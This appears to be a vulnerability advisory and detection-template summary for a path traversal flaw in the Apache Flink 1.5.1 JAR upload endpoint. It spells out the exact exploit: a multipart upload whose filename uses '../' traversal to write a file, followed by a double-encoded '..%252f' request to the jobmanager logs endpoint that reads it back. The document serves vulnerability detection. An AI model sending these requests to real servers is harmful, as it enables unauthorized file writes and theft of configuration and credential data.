## Vulnerability
Apache Flink 1.5.1 contains a local file inclusion vulnerability in its REST handler for JAR uploads. The flaw arises from insufficient sanitization of the filename field in multipart/form-data requests, allowing path traversal sequences to write files to arbitrary locations on the local filesystem.

An attacker can exploit this to place content anywhere (e.g., /tmp) and then retrieve it (or other sensitive files) through additional path traversal in the jobmanager logs endpoint, resulting in unauthorized access to configuration files, credentials, or other server data.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (score 7.5). CWE-22, CWE-23.

Remediation: Upgrade to 1.5.2 or later.

## PoC / Detection
Classification: info-leak

The template verifies the LFI/path-traversal flaw with a two-step raw HTTP sequence that actually writes and reads back attacker-controlled content:

1. POST /jars/upload with Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y, containing a form-data part named "jarfile" whose filename= "../../../../../../../tmp/poc" and body set to {{randstr}}.
2. GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc

Matcher checks that body_2 contains "{{randstr}}" and status_code == 200.
